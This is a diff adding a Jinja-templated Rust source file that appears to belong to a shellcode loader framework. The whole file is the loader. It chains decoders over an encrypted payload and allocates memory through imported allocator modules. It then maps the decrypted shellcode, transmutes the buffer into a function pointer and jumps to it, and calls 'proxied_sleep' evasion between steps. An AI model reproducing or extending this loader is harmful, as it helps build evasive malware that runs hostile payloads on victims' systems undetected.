@@ -1,0 +1,56 @@
+// THIS FILE IS CREATED BY scripts/build.rs
+// DO NOT MODIFY BY HAND - MODIFY THE TEMPLATES INSTEAD
+
+use crate::allocator::{AllocationFlags, Allocator, NtVirtunalAlloc};
+use crate::decoder::*;
+use crate::evasion::time::proxied_sleep;
+use crate::mapper::{Mapper, ShellcodeMapper};
+
+fn decode_file(data: &[u8]) -> Option<Vec<u8>> {
+{%- for decoder in decoders %}
+{%- set var_name = decoder.type | lower ~ "_decoder_" ~ loop.index %}
+{%- set template_path = "decoders/" ~ decoder.type | lower ~ ".rs.j2" %}
+    
+    // Initialize {{ decoder.type }}
+
+{%- include template_path %}
+
+{%- endfor %}
+
+{%- for decoder in decoders %}
+{%- set var_name = decoder.type | lower ~ "_decoder_" ~ loop.index %}
+{%- set input_var = "data" if loop.first else "&decoded_" ~ (loop.index - 1) %}
+{%- set output_var = "decoded_" ~ loop.index %}
+
+    let Ok({{ output_var }}) = {{ var_name }}.decode({{ input_var }}) else {
+        deprintln!("{{ decoder.type }} decoding failed at step {{ loop.index }}");
+        return None;
+    };
+{%- endfor %}
+
+    Some(decoded_{{ decoders | length }})
+}
+
+pub fn target(data: Vec<u8>) {
+    proxied_sleep();
+    
+{%- set allocator_path = "allocators/" ~ allocator | lower ~ ".rs.j2" %}
+{% include allocator_path %}
+
+        proxied_sleep();
+        dprintln!("Decrypting data");
+        if let Some(decrypted_data) = decode_file(&data) {
+
+            // Map
+{%- set mapper_path = "mappers/" ~ payload.format | lower ~ ".rs.j2" %}
+
+{% include mapper_path %}
+            mapper.map(&decrypted_data).unwrap();
+
+            dprintln!("Jumping to the start");
+            let fn_ptr: fn() = unsafe { std::mem::transmute(buff) };
+            fn_ptr();
+        }
+        
+    }
+}
